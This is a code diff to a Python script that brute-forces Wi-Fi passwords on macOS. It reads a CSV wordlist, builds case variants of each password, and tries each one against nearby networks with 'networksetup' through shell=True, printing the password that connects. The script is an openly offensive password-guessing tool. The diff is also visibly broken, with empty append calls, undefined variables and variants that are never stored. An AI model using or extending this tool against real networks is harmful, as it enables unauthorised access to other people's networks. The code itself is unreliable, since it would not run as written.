@@ -1,5 +1,5 @@
 import os, sys, csv
-from subprocess import call, check_output, CalledProcessError
+from subprocess import call, check_output, CalledProcessError, Popen
 import xml.etree.ElementTree as ET
 
 
@@ -33,29 +33,56 @@ def _sanitize_field(node):
 		return node
 	return node
 
-def process_element(itera,loop,elem,networks):
+def get_password_array(password):
+	password_data = []
+	pass_array = []
+	#all lower
+	alllow_pass = password
+	pass_array.append()
+	#all upper
+	allup_pass = _pass.upper()
+	pass_array.append()
+	#first upper
+	fup_pass = "".join(c.upper() if i in set([0]) else c for i, c in enumerate(_pass))
+	#every other lower
+	eol_pass = "".join(c.lower() if i % 2 == 0  else c for i, c in enumerate(_pass))
+	#every other upper
+	eou_pass = "".join(c.upper() if i % 2 == 0  else c for i, c in enumerate(_pass))
+
+	password_data.append(len(pass_array))
+	password_data.append(pass_array)
+	return password_data
+
+
+def process_element(itera,elem,networks):
 	net_size = net_array[0]
 	net_data = net_array[1]
 	net_names_array = net_array[2]
-
-	#might want to run all lower, all upper, first upper, every other lower, every other upper
-	_pass = _sanitize_field(elem[0])
 	_freq = _sanitize_field(elem[1])
+	_password = _sanitize_field(elem[0])
 
-	try:
-		for i in (0,net_size):
+	passwords = get_password_array(_password)
+
+	for i in range(0,net_size):
+		for j in range(0,passwords[0]):
 			#execute command to login to netowrk, find out how long this process is, this will be the benchmark point/bottleneck (can  run concurently?)
-			net_con = 'networksetup -setairportnetwork Airport %s %s' % (net_data[i],_pass)
-			#or use call to check state
-			#call(net_con, shell=True)
-			output = check_output(net_con, shell=True)
+			#six ~seconds for succesful connect, 
+			try:
+				net_con = 'networksetup -setairportnetwork Airport %s %s' % (net_names_array[i],passwords[1][j])
+				#or use call to check state or use popen to kill after 7 seconds
+				#ouput = Popen(net_con, shell=True)
+				#ouput.kill()
+
+				#call(net_con, shell=True)
+				output = check_output(net_con, shell=True)
+			except CalledProcessError:
+				continue
 
 			if output:
 				#if connection is succesful
-			print 'Network Name: %s\n Network SSID: %s\n Network Password: %s\n' % (net_names_array[i],net_data[i],_pass)
-			sys.exit()
-	except CalledProcessError:
-		pass
+				print 'Network Name: %s\n Network SSID: %s\n Network Password: %s\n' % (net_names_array[i],net_data[i],alllow_pass)
+				sys.exit()
+	
 
 #get network array (size of list, list)
 network_data = get_network_list()
@@ -66,4 +93,4 @@ with open(PASSWORDS, 'rU') as f:
 	reader = csv.reader(f)
 	for i, line in enumerate(reader):
 		#print line
-		process_element(i,x,line,net_array)
+		process_element(i,line,net_array)
